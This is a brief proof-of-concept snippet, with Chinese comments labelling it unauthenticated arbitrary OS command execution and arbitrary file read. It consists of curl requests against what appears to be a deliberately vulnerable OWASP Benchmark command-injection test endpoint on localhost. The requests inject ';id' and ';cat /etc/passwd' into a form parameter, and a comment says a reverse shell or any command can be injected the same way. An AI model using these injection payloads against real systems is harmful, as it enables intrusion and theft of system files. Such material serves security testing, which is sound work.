# 任意 OS 命令执行（无鉴权）
curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00267' \
  -d 'BenchmarkTest00267=;id'

# 读取任意文件
curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00267' \
  -d 'BenchmarkTest00267=;cat /etc/passwd'

# 反向 shell 或任意命令均可通过 shell 元字符注入